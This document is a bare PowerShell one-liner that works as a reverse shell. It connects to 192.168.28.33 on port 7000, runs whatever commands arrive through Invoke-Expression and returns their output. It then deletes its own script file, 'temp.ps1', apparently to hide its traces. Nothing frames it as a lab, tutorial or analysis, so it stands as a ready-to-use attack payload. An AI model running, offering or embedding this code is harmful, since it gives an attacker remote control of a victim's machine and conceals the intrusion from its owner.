$con=New-Object Net.Sockets.TCPClient("192.168.28.33",7000);$soc = $con.GetStream();[byte[]]$by = 0..65535|%{0};while(($i = $soc.Read($by, 0, $by.Length)) -ne 0){$d = ([Text.Encoding]::ASCII).GetString($by,0, $i);$sb = (iex $d 2>&1 | Out-String);$sby = ([Text.Encoding]::ASCII).GetBytes($sb);$soc.Write($sby,0,$sby.Length)};$con.Close();Remove-item 'temp.ps1';